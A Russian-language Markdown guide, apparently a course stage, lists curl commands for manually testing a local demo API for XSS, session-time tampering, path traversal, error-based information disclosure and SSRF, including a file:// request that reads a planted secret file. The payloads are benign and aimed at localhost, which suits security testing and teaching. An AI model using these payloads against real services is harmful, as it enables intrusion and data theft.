# Stage 3 — Ручное тестирование (curl)

## 0) Запуск приложения

```bash
./gradlew run
# API: http://localhost:7000
```

---

## 1) Базовая регистрация и профиль

```bash
curl -X POST "http://localhost:7000/register?userId=test&userName=Alice"
curl "http://localhost:7000/userProfile?userId=test"
```

---

## 2) XSS в userProfile

```bash
curl -X POST "http://localhost:7000/register?userId=evil&userName=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl "http://localhost:7000/userProfile?userId=evil"
```

---

## 3) Tampering: отрицательная длительность сессии

```bash
curl -X POST "http://localhost:7000/register?userId=tamper&userName=Alice"
curl -X POST "http://localhost:7000/recordSession?userId=tamper&loginTime=2026-01-02T12:00:00&logoutTime=2026-01-02T11:00:00"
curl "http://localhost:7000/totalActivity?userId=tamper"
```

---

## 4) Path Traversal в exportReport

```bash
curl -X POST "http://localhost:7000/register?userId=ptr&userName=Bob"
curl "http://localhost:7000/exportReport?userId=ptr&filename=..%2Foutside.txt"
```

---

## 5) Information Disclosure через ошибки

```bash
curl -X POST "http://localhost:7000/recordSession?userId=u1&loginTime=not-a-date&logoutTime=still-not-a-date"
curl -X POST "http://localhost:7000/register?userId=u2&userName=Alice"
curl -X POST "http://localhost:7000/notify?userId=u2&callbackUrl=not-a-url"
```

---

## 6) SSRF (localhost)

```bash
# В отдельном терминале:
python3 -m http.server 7780

# В терминале с API:
curl -X POST "http://localhost:7000/notify?userId=u2&callbackUrl=http%3A%2F%2Flocalhost%3A7780"
```

---

## 7) SSRF (file://)

```bash
echo "DB_PASSWORD=super-secret" > /tmp/ssrf-secret.txt
curl -X POST "http://localhost:7000/notify?userId=u2&callbackUrl=file%3A%2F%2F%2Ftmp%2Fssrf-secret.txt"
```

---

## 8) Дополнительно: граничные проверки

```bash
curl "http://localhost:7000/userProfile"
curl "http://localhost:7000/userProfile?userId=unknown"
curl "http://localhost:7000/inactiveUsers"
curl "http://localhost:7000/inactiveUsers?days=abc"
curl "http://localhost:7000/monthlyActivity?userId=test&month=not-a-month"
```
